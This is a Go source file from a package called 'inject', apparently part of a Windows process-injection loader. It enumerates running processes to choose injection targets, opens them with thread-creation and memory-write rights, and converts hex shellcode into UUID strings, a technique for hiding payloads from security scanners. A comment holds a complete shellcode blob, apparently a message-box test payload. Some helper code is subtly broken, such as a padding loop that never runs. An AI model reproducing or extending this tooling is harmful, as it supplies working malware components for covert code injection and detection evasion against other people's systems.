package inject

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"unicode/utf16"

	"github.com/gofrs/uuid"
	"golang.org/x/sys/windows"
)

const errSuccess string = "The operation completed successfully."

func SelectRandomElement(array []uint32) int {
	randomIndex := rand.Intn(len(array))
	chosen := array[randomIndex]
	return int(chosen)
}

func Get64BitProcesses() []uint32 {
	fmt.Printf("\n[+] Listing running processes")

	processes, cbNeeded := EnumProcesses()

	var candidates []uint32
	for i := 0; i < int(cbNeeded); i++ {
		pid := processes[i]
		if pid == 0 && i > 0 {
			break
		} else if pid != uint32(os.Getpid()) {
			bitness := Is64Bit(pid)
			if bitness == 0 {
				candidates = append(candidates, pid)
			}
		}
	}
	fmt.Printf("\n[+] Number of process injection candidates: %d", len(candidates))
	return candidates
}

func Is64Bit(pid uint32) int {

	pHandle, err := OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, pid)

	if err.Error() == errSuccess {
		bitness := IsWow64Process(pHandle)
		CloseHandle(pHandle)
		return int(bitness)

	} else {
		CloseHandle(pHandle)
		return -1
	}
}

func StringToCharPtr(str string) *uint8 {
	chars := append([]byte(str), 0) // null terminated
	return &chars[0]
}

func StringToUTF16Ptr(str string) *uint16 {
	wchars := utf16.Encode([]rune(str + "\x00"))
	return &wchars[0]
}

// SplitToWords - Splits a slice into multiple slices based on word length.
func SplitToWords(array []byte, wordLen int, pad_incomplete bool) [][]byte {
	words := [][]byte{}
	for i := 0; i < len(array); i += wordLen {
		word := array[i : i+wordLen]

		if pad_incomplete && len(word) < wordLen {
			for j := len(word); j < len(word); j++ {
				word = append(word, 0)
			}
		}
		words = append(words, word)
	}
	return words
}

// SwapEndianness - Heavily inspired by code from CyberChef https://github.com/gchq/CyberChef/blob/c9d9730726dfa16a1c5f37024ba9c7ea9f37453d/src/core/operations/SwapEndianness.mjs
func SwapEndianness(array []byte, word_len int, pad_incomplete bool) []byte {

	// Split into words.
	words := SplitToWords(array, word_len, pad_incomplete)

	// Rejoin into single slice.
	result := []byte{}
	for i := 0; i < len(words); i++ {
		for k := len(words[i]) - 1; k >= 0; k-- {
			result = append(result, words[i][k])
		}
	}
	return result
}

// Test fc4881e4f0ffffffe8d0000000415141505251564831d265488b52603e488b52183e488b52203e488b72503e480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241513e488b52203e8b423c4801d03e8b80880000004885c0746f4801d0503e8b48183e448b40204901d0e35c48ffc93e418b34884801d64d31c94831c0ac41c1c90d4101c138e075f13e4c034c24084539d175d6583e448b40244901d0663e418b0c483e448b401c4901d03e418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a3e488b12e949ffffff5d49c7c1000000003e488d95fe0000003e4c8d850a0100004831c941ba45835607ffd54831c941baf0b5a256ffd568656c6c6f20776f726c64004d657373616765426f7800
func ConvertToUUIDS(payload string) []string {

	uuids := []string{}

	sc, _ := hex.DecodeString(payload)

	for i := 0; i < len(sc); i += 16 {

		fmt.Println([]byte(sc)[i : i+16])

		leBytes1 := SwapEndianness([]byte(sc)[i:i+4], 4, false)
		leBytes2 := SwapEndianness([]byte(sc)[i+4:i+8], 4, false)

		fmt.Println(leBytes2)
		leBytes3 := append(leBytes2[2:4], leBytes2[0:2]...)

		leBytes := append(leBytes1, leBytes3...)
		leBytes = append(leBytes, []byte(sc)[i+8:i+16]...)
		fmt.Println(leBytes)

		uuid, err := uuid.FromBytes(leBytes)
		if err != nil {
			fmt.Println(err)
		}
		uuids = append(uuids, uuid.String())
	}

	return uuids
}
